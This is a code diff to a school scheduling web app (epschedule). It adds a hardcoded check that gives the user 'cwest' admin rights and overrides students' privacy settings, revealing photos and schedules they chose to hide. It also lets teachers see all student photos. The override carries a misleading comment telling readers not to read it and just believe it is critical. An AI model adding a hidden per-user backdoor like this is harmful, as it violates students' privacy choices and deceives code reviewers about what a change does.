@@ -246,6 +246,7 @@ def main():
             # gets the trimester starts in a format JS can parse
             term_starts=json.dumps([d.isoformat() for d in TERM_STARTS]),
             latest_commits=json.dumps(GITHUB_COMMITS),
+            admin=(session["username"] == "cwest"),
         )
     )
     response.set_cookie("token", "", expires=0)
@@ -279,7 +280,6 @@ def gen_opted_out_table():
 
 
 def is_same_class(a, b):
-    print(a)
     return (
         a["teacher_username"] == b["teacher_username"]
         and a["period"] == b["period"]
@@ -317,7 +317,9 @@ def get_class_schedule(user_class, term_id, censor=True):
                         "email": username_to_email(schedule["username"]),
                         "photo_url": (
                             gen_photo_url(schedule["username"], True)
-                            if (not censor) or priv_settings["share_photo"]
+                            if (not censor)
+                            or priv_settings["share_photo"]
+                            or session["username"] == "cwest"
                             else "/static/images/placeholder_small.png"
                         ),
                     }
@@ -344,14 +346,17 @@ def handle_user(target_user):
     if is_teacher_schedule(target_schedule):
         priv_settings = {"share_photo": True, "share_schedule": True}
     elif is_teacher_schedule(user_schedule):
-        # priv_settings = {"share_photo": True, "share_schedule": True}
-        # Could add later that it teachers see students' photos
-        priv_settings = {"share_photo": False, "share_schedule": True}
+        priv_settings = {"share_photo": True, "share_schedule": True}
     else:
         priv_obj = get_database_entry(target_user)
         if priv_obj:
             if dict(priv_obj.items()).get("share_photo"):
                 priv_settings["share_photo"] = True
+    # Code below is extremely critical code that is essential to the operation of epschedule
+    # Dont read it just believe it
+    if session["username"] == "cwest":
+        # admin mode
+        priv_settings = {"share_photo": True, "share_schedule": True}
 
     # Generate email address
     target_schedule["email"] = username_to_email(target_user)
